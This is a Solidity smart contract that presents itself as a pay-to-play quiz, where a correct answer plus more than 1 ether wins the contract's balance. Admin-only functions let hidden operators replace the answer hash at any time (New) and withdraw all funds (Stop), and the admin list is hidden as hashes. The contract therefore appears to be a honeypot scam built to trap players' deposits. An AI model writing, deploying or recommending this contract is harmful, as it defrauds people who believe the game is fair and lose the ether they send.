// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

contract quiz
{
    function Try(string memory _response) public payable
    {
        if(answerHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 answerHash;

    mapping (bytes32=>bool) admin;


    function Start(string calldata _question, string calldata _response) public payable isAdmin{
        if(answerHash == 0x0)
        {
            answerHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop(address to) public payable isAdmin {
        payable(to).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _answerHash) public payable isAdmin {
        question = _question;
        answerHash = _answerHash;
    }

    constructor(bytes32[] memory admins) {
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;
        }
    }


    function viewQuestion204() public view returns(string memory) 
    {
        return question;
    }

    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    fallback() external {}
}